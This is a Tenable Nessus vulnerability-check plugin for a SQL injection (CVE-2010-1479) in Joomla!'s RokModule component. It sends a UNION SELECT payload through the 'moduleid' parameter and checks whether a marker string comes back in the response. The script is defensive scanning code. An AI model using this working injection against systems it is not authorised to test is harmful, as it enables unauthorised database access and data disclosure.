#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46337);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2010-1479");
  script_bugtraq_id(39378);
  script_osvdb_id(63710);
  script_xref(name:"EDB-ID", value:"12148");
  script_xref(name:"Secunia", value:"39255");

  script_name(english:"RokModule Component for Joomla! 'moduleid' Parameter SQi");
  script_summary(english:"Attempts to cause mod_breadcrumbs to be rendered with a special value for homeText.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the RokModule component for Joomla! running on the
remote host is affected by a SQL injection vulnerability due to
improper sanitization of user-supplied input to the 'moduleid'
parameter before using it to construct database queries. Regardless of
the PHP 'magic_quotes_gpc' setting, an unauthenticated, remote
attacker can exploit this issue to manipulate database queries,
resulting in disclosure of sensitive information, modification of
data, or other attacks against the underlying database.");
  # https://web.archive.org/web/20101224083133/http://www.rockettheme.com/extensions-updates/673-rokmodule-security-update-released
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d969e20e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to RokModule version 1.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "RokModule";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>RokModule<');
  checks["/administrator/components/com_rokmodule/rokmodule.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to exploit the issue
magic = '_NESSUS-' + SCRIPT_NAME - ".nasl" + '-' + unixtime();
context = '</span>';
exploit = '999 UNION SELECT ' +
    '1,2,3,4,5,6,7,8,' +
    '"mod_breadcrumbs",' +
    '10,11,12,' +
    '"homeText=' + magic  + '",' +
    '14,15,16';

url = '/index.php?option=com_rokmodule&tmpl=component&type=raw&offset=_OFFSET_&moduleid=' + urlencode(str:exploit);

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# There is a problem if we see our magic....
if (magic + context >< res[2])
{
  output = strstr(res[2], magic);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      sqli        : TRUE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : chomp(output)
    );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
